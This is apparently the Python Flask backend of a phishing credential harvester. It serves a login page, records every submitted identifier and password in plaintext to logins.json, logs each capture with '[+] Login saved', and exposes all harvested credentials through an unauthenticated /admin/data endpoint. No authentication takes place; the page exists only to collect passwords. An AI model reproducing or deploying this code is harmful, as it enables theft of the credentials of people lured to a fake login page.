from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import json
import os
from datetime import datetime

app = Flask(__name__, static_folder='public')
CORS(app)

DATA_FILE = 'logins.json'

# Create the file if it doesn't exist
if not os.path.exists(DATA_FILE):
    with open(DATA_FILE, 'w') as f:
        json.dump([], f)


def read_logins():
    with open(DATA_FILE, 'r') as f:
        return json.load(f)


def write_logins(data):
    with open(DATA_FILE, 'w') as f:
        json.dump(data, f, indent=2)


# Serve the login page
@app.route('/')
def index():
    return send_from_directory('public', 'index.html')


# Serve the admin page
@app.route('/admin')
def admin():
    return send_from_directory('public', 'admin.html')


# POST /login — save a login attempt
@app.route('/login', methods=['POST'])
def login():
    data = request.get_json()
    identifier = data.get('identifier', '').strip()
    password = data.get('password', '').strip()

    if not identifier or not password:
        return jsonify({'success': False, 'message': 'Missing fields'}), 400

    entry = {
        'id': int(datetime.now().timestamp() * 1000),
        'identifier': identifier,
        'password': password,
        'timestamp': datetime.now().isoformat()
    }

    logins = read_logins()
    logins.append(entry)
    write_logins(logins)

    print(f"[+] Login saved: {identifier}")
    return jsonify({'success': True, 'message': 'Login saved.'})


# GET /admin/data — return all stored logins
@app.route('/admin/data', methods=['GET'])
def admin_data():
    logins = read_logins()
    return jsonify(logins)


# DELETE /admin/clear — wipe all entries
@app.route('/admin/clear', methods=['DELETE'])
def admin_clear():
    write_logins([])
    return jsonify({'success': True})


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 3000)), debug=False)